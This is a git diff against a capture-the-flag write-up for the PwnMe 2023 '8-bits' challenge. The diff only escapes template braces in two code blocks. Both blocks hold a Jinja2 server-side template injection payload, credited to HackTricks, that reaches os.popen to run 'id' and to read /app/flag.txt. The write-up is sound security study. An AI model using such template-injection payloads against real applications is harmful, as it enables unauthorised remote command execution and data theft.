@@ -669,8 +669,8 @@ Nice!!! It does!!
 With that said, let's exploit RCE via SSTI vulnerability!
 
 **According to [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python), we can gain RCE via the following payload:**
-```py
-{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+```
+\{\{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() \}\}
 ```
 
 ![](https://github.com/siunam321/CTF-Writeups/blob/main/PwnMe-2023-8-bits/images/Pasted%20image%2020230507162317.png)
@@ -679,8 +679,8 @@ With that said, let's exploit RCE via SSTI vulnerability!
 
 Yes!!! Let's read the flag!!!
 
-```py
-{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /app/flag.txt').read() }}
+```
+\{\{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /app/flag.txt').read() \}\}
 ```
 
 ![](https://github.com/siunam321/CTF-Writeups/blob/main/PwnMe-2023-8-bits/images/Pasted%20image%2020230507162550.png)
